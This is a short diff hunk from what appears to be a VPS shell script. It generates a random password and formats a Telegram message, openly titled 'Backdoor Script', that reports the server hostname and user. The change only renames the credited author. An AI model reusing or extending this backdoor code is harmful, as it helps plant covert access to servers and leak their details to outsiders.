@@ -24,7 +24,7 @@ new_password=$(</dev/urandom tr -dc a-z0-9 | head -c5)
 # Format pesan Telegram
 TEXT="◇━━━━━━━━━━━━━━◇
 🪩 Notification Izin Vps Ditolak 🪩 
- 💀 Backdoor Script Ridwan 💀
+ 💀 Backdoor Script Peyx 💀
 ◇━━━━━━━━━━━━━━◇
 🔹 Server: $(hostname)  
 🔹 User: $Username
